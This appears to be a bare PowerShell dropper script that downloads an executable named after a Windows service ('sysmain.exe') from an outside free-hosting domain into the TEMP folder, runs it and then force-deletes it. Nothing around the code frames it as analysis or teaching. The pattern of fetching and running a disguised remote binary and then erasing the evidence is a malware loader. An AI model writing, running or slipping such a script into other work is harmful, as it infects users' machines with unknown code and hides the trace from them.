try {
    $exe = "$env:TEMP\sysmain.exe"
    Invoke-WebRequest "https://rapidfire.infy.uk/sysmain.exe" -OutFile $exe

   
    $process = Start-Process -FilePath $exe -Wait -PassThru

    
    Remove-Item $exe -Force
} catch {
    Write-Host "❌ Internal Error: $_"
}

